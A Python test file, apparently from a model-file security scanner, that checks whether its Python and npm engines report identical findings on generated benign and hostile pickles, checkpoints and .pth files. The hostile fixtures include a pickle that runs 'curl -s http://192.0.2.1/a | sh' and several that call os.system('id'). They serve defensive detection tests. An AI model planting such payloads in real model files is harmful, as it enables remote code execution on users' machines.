"""Engine parity for model files (FP-MODEL-FILES): the Python CLI and the npm CLI report the same findings (rule, file,
line, severity, message), metrics, gate and exit code on a tree of model files — checkpoints, pickles, joblib's and
numpy's files, benign and hostile, cut short, one of the project's own class, checkpoints of 200 MB (sparse files,
read by range), a dependency's under --deps, and the precision review's (Oct 21): the libraries' benign files
(tests/fixtures/model_files), the standard library's data types, enums' member lookups of the project's own and a
dependency's enums (MAJOR: calls with text), a zip of one pickle. The
expectations are in tests/scanner/test_review_model_files.py; this holds the packages to each other. Files built in
the test (tests/_model_files.py), inert. Skipped where the npm engine is not built (node, and npm run build in js/).
"""
import collections
import os
import tempfile
import unittest

from tests import _model_files as mf
from tests.architecture.test_js_parity import DERIVED, NPM_READY, NPM_SKIP, both, derived, issue_key
from tests.scanner.test_review_model_precision import fixtures, stdlib_data

SP = ".venv/lib/python3.12/site-packages"


def model_tree():
    return {
        "app.py": "import mymodel\n", "mymodel.py": "class Net: pass\n",
        "golden/golden.pt": mf.state_dict_pt("golden"), "w/legacy.pt": mf.legacy_pt(), "w/last.ckpt": mf.lightning_ckpt(),
        "w/tree.joblib": mf.sklearn_tree(), "w/arrays.npz": mf.npz({"a.npy": mf.npy("<f8", bytes(24))}),
        "w/objects.npy": mf.npy_objects(["a", 1]), "w/full.pt": mf.full_model_pt("mymodel"),
        "w/bad.pt": mf.torch_zip(mf.os_system("curl -s http://192.0.2.1/a | sh")),
        **{f"h/{k}": v for k, v in mf.hostile().items()},
        "h/cut.pkl": mf.os_system("id")[:-3], "h/m.pkl.bz2": b"BZh91AY&SY" + bytes(20),
        ".venv/pyvenv.cfg": "home = /usr/bin\n", f"{SP}/dep/__init__.py": "x = 1\n",
        f"{SP}/dep/model.py": "class M: pass\n", f"{SP}/dep/w.pt": mf.full_model_pt("dep.model"),
        f"{SP}/dep/bad.pkl": mf.os_system("id"),
        # (parts: sparse files of 200 MB, read by range)
        "big/ok.pt": mf.big_torch_zip(mf._torch_pickle({"w": 1}), [200_000_000]),
        "big/bad.pt": mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                       more=[("archive/constants.pkl", mf.os_system("id"))]),
        f"{SP}/dep/big.pt": mf.big_torch_zip(mf.os_system("id"), [200_000_000]),
        # (5 GB, zip64: offsets past 4 GiB, which the WebAssembly engine, a 32-bit build, reads as the native one)
        "big/zip64.pt": mf.big_torch_zip(mf._torch_pickle({}), [2_500_000_000, 2_500_000_000],
                                         more=[("archive/extra.pkl", mf.os_system("id"))]),
        # (.pth: its lines read in chunks, beside its pickle by range)
        "big/model.pth": mf.big_torch_zip(mf._torch_pickle({"w": 1}), [200_000_000]),
        "big/evil.pth": mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                         more=[("archive/extra/notes", b"\nimport os; os.system('id')\n")]),
        f"{SP}/dep/evil.pth": mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                               more=[("archive/extra/notes", b"\nimport sys\n")]),
        "long.pth": "import os  # " + "a" * 17_000_000 + "\nimport sys\n",
        # (the precision review: quiet, but for the own enum's INFO and the MAJOR of the calls with text)
        **{f"p/{k}": v for k, v in {**fixtures(), **stdlib_data()}.items()},
        "kinds.py": "import enum\n\nclass Source(enum.Enum):\n    HUB = 'https://hub.invalid/x'\n",
        f"{SP}/hubkit/__init__.py": "", f"{SP}/hubkit/kinds.py": "from enum import Enum\n\nclass Source(Enum):\n    A = '/data/x'\n",
        "p/own_enum.pkl": enum_pickle("kinds", "https://hub.invalid/x"),
        "p/main_enum.pkl": enum_pickle("__main__", "https://hub.invalid/x"),
        "p/dep_enum.pkl": enum_pickle("hubkit.kinds", "/data/x"),
        "p/frame.pkl.zip": zipped({"frame.pkl": mf.plain_pickle({"a": [1, 2]}, 4)}),
        "p/bad.pkl.zip": zipped({"frame.pkl": mf.os_system("id")}),
    }


def enum_pickle(module, value):
    source = mf.fn(module, "Source")
    return mf.plain_pickle([mf.Reduce(source, (value,))], 2, {module: {"Source": source}})


def zipped(members):
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


def classes_pickle(n):
    """A pickle that makes n classes with builtins.type, one after another (protocol 2, written opcode by opcode)."""
    out = bytearray(b"\x80\x02")
    for k in range(n):
        name = f"C{k}".encode()
        out += b"cbuiltins\ntype\n" + b"\x8c" + bytes([len(name)]) + name + b")}\x87R0"
    return bytes(out + b"N.")


def cap_tree():
    """(the external re-review of Oct 28, its LOW) a model file past each cap that drops findings: 70 places code runs
    (64 listed), a checkpoint of 70 programs (64 findings listed) and an .npz of 20 members that cannot be read (16
    listed)."""
    exe = b"MZ" + bytes(256)
    bad_npy = b"\x93NUMPY\x09\x00" + bytes(8)
    return {"caps/classes.pkl": classes_pickle(70),
            "caps/members.pt": mf.torch_zip(b"\x80\x02N.", more=[(f"archive/extra/tool{k}.exe", exe) for k in range(70)]),
            "caps/bad.npz": mf.npz({f"a{k}.npy": bad_npy for k in range(20)}),
            "caps/ok.pkl": classes_pickle(64)}


def write(root, files):
    for rel, data in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        if isinstance(data, list):
            mf.write_parts(path, data)
            continue
        with open(path, "wb") as fh:
            fh.write(data.encode("utf-8") if isinstance(data, str) else data)


@unittest.skipUnless(NPM_READY, NPM_SKIP)
class ModelFileParityTests(unittest.TestCase):
    maxDiff = None

    def assert_same(self, deps, tree=None):
        with tempfile.TemporaryDirectory() as root:
            write(root, model_tree() if tree is None else tree)
            (js_exit, js, js_err), (py_exit, py, py_err) = both(root, deps=deps)
        self.assertIsNotNone(js, f"JS wrote no report (exit {js_exit}): {js_err[-500:]}")
        self.assertIsNotNone(py, f"Python wrote no report (exit {py_exit}): {py_err[-500:]}")
        js_c = collections.Counter(issue_key(i) for i in js["issues"])
        py_c = collections.Counter(issue_key(i) for i in py["issues"])
        self.assertEqual({"only the JS engine reports": sorted((js_c - py_c).elements()),
                          "only the Python engine reports": sorted((py_c - js_c).elements())},
                         {"only the JS engine reports": [], "only the Python engine reports": []})
        self.assertEqual(js["metrics"], py["metrics"])
        for field in DERIVED:
            self.assertEqual(derived(js, field), derived(py, field), field)
        self.assertEqual(js_exit, py_exit)
        return py

    def test_model_files(self):
        report = self.assert_same(deps=False)
        rules = collections.Counter(i["rule"] for i in report["issues"])
        self.assertGreaterEqual(rules["SC-PICKLE-CODE"], len(mf.hostile()) + 1)
        found = {(i["file"].replace("\\", "/"), i["rule"]) for i in report["issues"]}
        # w/full.pt and p/own_enum.pkl: the project's own classes (INFO); p/own_enum.pkl, p/main_enum.pkl and
        # p/dep_enum.pkl: calls with text (MAJOR, whatever the scan's source says of the class)
        pg = sorted((i["file"].replace("\\", "/"), i["sev"]) for i in report["issues"] if i["rule"] == "SC-PICKLE-GLOBAL")
        self.assertEqual(pg, [("p/dep_enum.pkl", "MAJOR"), ("p/main_enum.pkl", "MAJOR"), ("p/own_enum.pkl", "INFO"),
                              ("p/own_enum.pkl", "MAJOR"), ("w/full.pt", "INFO")])
        self.assertEqual({f for f, r in found if f.startswith("p/")},
                         {"p/bad.pkl.zip", "p/dep_enum.pkl", "p/main_enum.pkl", "p/own_enum.pkl"})
        self.assertIn(("p/bad.pkl.zip", "SC-PICKLE-CODE"), found)
        self.assertIn(("big/bad.pt", "SC-PICKLE-CODE"), found)
        self.assertIn(("big/zip64.pt", "SC-PICKLE-CODE"), found)
        self.assertIn(("big/evil.pth", "SC-PTH-EXEC"), found)
        self.assertFalse(any(f == "big/model.pth" for f, _ in found))
        self.assertIn(("long.pth", "SC-TRUNCATED"), found)
        self.assertFalse(any(f == "big/ok.pt" for f, _ in found))
        # (the checkpoints with a member their format has not keep SC-NESTED-ARCHIVE: the external review of Oct 21)
        nested = sorted(f for f, r in found if r == "SC-NESTED-ARCHIVE")
        self.assertEqual(nested, ["big/bad.pt", "big/evil.pth", "big/zip64.pt"])
        self.assertGreaterEqual(rules["SC-TRUNCATED"], 2)

    def test_a_cap_that_drops_findings_says_how_many(self):
        """Past each cap, the count of what it passed over is said (SC-TRUNCATED), alike in both packages; what is
        listed is as before (the external re-review of Oct 28, its LOW)."""
        report = self.assert_same(deps=False, tree=cap_tree())
        notes = [(i["file"].replace("\\", "/"), i["msg"]) for i in report["issues"]
                 if i["rule"] == "SC-TRUNCATED" and " were not listed (more than " in i["msg"]]
        for file, said in (("caps/classes.pkl", "6 more places the pickles run code were not listed (more than 64)"),
                           ("caps/members.pt", "6 more findings in the model file's members were not listed (more than 64)"),
                           ("caps/bad.npz", "4 more parts of the model file that could not be read were not listed (more "
                                            "than 16)")):
            self.assertTrue(any(f == file and said in m for f, m in notes), (file, said, notes))
        self.assertEqual(len(notes), 3, notes)
        found = collections.Counter((i["file"].replace("\\", "/"), i["rule"]) for i in report["issues"])
        self.assertGreater(found[("caps/classes.pkl", "SC-PICKLE-CODE")], 0)
        self.assertGreater(found[("caps/ok.pkl", "SC-PICKLE-CODE")], 0)
        self.assertEqual(found[("caps/members.pt", "SC-BINARY")], 64)

    def test_model_files_with_deps(self):
        report = self.assert_same(deps=True)
        dep = {(i["file"].replace("\\", "/"), i["rule"]) for i in report["issues"]}
        self.assertIn((f"{SP}/dep/bad.pkl", "SC-PICKLE-CODE"), dep)
        self.assertIn((f"{SP}/dep/w.pt", "SC-PICKLE-GLOBAL"), dep)
        self.assertIn((f"{SP}/dep/big.pt", "SC-PICKLE-CODE"), dep)
        self.assertIn((f"{SP}/dep/evil.pth", "SC-PTH-EXEC"), dep)
        # (the dependency's source read or not, its enum looked up by a path: MAJOR)
        self.assertIn(("p/dep_enum.pkl", "SC-PICKLE-GLOBAL"), dep)


if __name__ == "__main__":
    unittest.main()
